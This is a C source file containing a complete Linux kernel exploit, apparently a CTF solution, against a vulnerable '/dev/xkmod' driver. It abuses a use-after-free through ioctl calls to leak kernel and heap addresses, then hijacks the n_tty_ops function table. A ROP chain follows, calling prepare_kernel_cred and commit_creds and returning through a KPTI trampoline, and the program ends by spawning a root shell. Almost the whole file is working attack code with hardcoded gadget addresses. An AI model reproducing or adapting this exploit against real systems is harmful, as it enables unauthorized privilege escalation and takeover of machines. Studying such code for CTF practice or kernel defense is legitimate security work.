#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
 
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <linux/keyctl.h>
#include <ctype.h>
#include <pthread.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <sys/sem.h>
#include <semaphore.h>
#include <poll.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <asm/ldt.h>
#include <sys/shm.h>
#include <sys/wait.h>
#include <sys/socket.h>

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[x] Error at: \033[0m%s\n", msg);
    sleep(5);
    exit(EXIT_FAILURE);
}

void info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\n\033[0m", msg);
}

void hexx(char *msg, size_t value)
{
    printf("\033[32m\033[1m[+] %s: %#lx\n\033[0m", msg, value);
}

void binary_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("\033[33m[*] %s:\n\033[0m", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

/* root checker and shell poper */
void get_root_shell(void)
{
    if(getuid()) {
        puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
        sleep(5);
        exit(EXIT_FAILURE);
    }

    puts("\033[32m\033[1m[+] Successful to get the root. \033[0m");
    puts("\033[34m\033[1m[*] Execve root shell now...\033[0m");

    system("/bin/sh");

    /* to exit the process normally, instead of segmentation fault */
    exit(EXIT_SUCCESS);
}

/* userspace status saver */
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

/* bind the process to specific core */
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
}

struct node {
	char* ptr;
	unsigned int offset;
	unsigned int size;
};

void add(int fd) 
{
	struct node n = { 0 };
	ioctl(fd, 0x1111111, &n);
}

void xread(int fd, char* ptr, unsigned int offset, unsigned int size)
{
	struct node n = { .ptr = ptr, .offset = offset, .size = size };
	ioctl(fd, 0x7777777, &n);
}

void xwrite(int fd, char* ptr, unsigned int offset, unsigned int size)
{
	struct node n = { .ptr = ptr, .offset = offset, .size = size };
	ioctl(fd, 0x6666666, &n);
}

#define SECONDARY_STARTUP_64 0xffffffff81000030
#define N_TTY_OPS_plus8 0xffffffff824b1170
#define OPEN 0xffffffff81466710
#define CLOSE 0xffffffff81464dc0
#define FLUSH_BUFFER 0xffffffff814654b0
#define READ 0xffffffff81465a10

size_t add_rsp_xx = 0xffffffff811454aa; // add rsp, 0xc8 ; ret;
size_t pop_rdi = 0xffffffff81001518;
size_t commit_creds = 0xffffffff8108a660;
size_t prepare_kernel_cred = 0xffffffff8108a9a0;
size_t xchg_rdi_rax = 0xFFFFFFFF8148C492;
size_t swapgs_kpti = 0xFFFFFFFF81C00A39;
char temp[8];

int main(int argc, char** argv, char** env)
{
	bind_core(0);
	int fd[3];
	size_t heap_addr;
	size_t page_offset_base;
	size_t kernel_offset;
	size_t buf[0x50] = { 0 };	

	for (int i = 0; i < 3; i++)
		if ((fd[i] = open("/dev/xkmod", O_RDONLY)) < 0) err_exit("open xkmod");

	add(fd[0]);
	close(fd[0]);
	xread(fd[1], buf, 0, 0x50);
	binary_dump("free object data", buf, 0x50);	
	heap_addr = buf[0];
	page_offset_base = heap_addr & 0xfffffffff0000000;
	hexx("heap_addr", heap_addr);
	hexx("Guessing page_offset_base", page_offset_base);	
	
	buf[0] = page_offset_base+0x9d000-0x10;
	xwrite(fd[1], buf, 0, 8);

	add(fd[1]);
	add(fd[1]);	
	xread(fd[1], buf, 0, 0x50);
	binary_dump("free object data", buf, 0x50);
	if ((buf[2] < 0xffffffff81000000) || ((buf[2]&0xfff) != 0x30)) err_exit("Failed to kmalloc the secondary_startup_64");
	kernel_offset = buf[2] - SECONDARY_STARTUP_64;
	hexx("kernel_offset", kernel_offset);	

	add(fd[1]);	
	close(fd[1]);
	buf[0] = N_TTY_OPS_plus8 + kernel_offset;
	xwrite(fd[2], buf, 0, 8);
	
	add(fd[2]);
	add(fd[2]);
	xread(fd[2], buf, 0, 0x50);
	binary_dump("free object data", buf, 0x50);
	
	buf[0] = 0;
	buf[1] = OPEN+kernel_offset;
	buf[2] = CLOSE+kernel_offset;
	buf[3] = FLUSH_BUFFER+kernel_offset;
	buf[4] = add_rsp_xx+kernel_offset;
	hexx("n_tty_ops->read", buf[4]);
	binary_dump("fake n_tty_ops", buf, 0x50);
	xwrite(fd[2], buf, 0, 0x28);
	
	pop_rdi += kernel_offset;
	commit_creds += kernel_offset;
	prepare_kernel_cred += kernel_offset;
	xchg_rdi_rax += kernel_offset;
	swapgs_kpti += kernel_offset;
	asm(
	"mov r15, pop_rdi;"
	"mov r14, 0;"
	"mov r13, prepare_kernel_cred;"
	"mov r12, xchg_rdi_rax;"
	"mov rbp, commit_creds;"
	"mov rbx, swapgs_kpti;"
	"mov rax, 0;"
	"mov rdx, 8;"
	"mov rsi, rsp;"
	"mov rdi, 0;"
	"syscall;"
	);

	buf[4] = READ+kernel_offset;
	xwrite(fd[2], buf, 0, 0x28);
//	add(fd[2]);	
	hexx("UID", getuid());
	system("/bin/sh");
	info("End!");
        return 0;
}
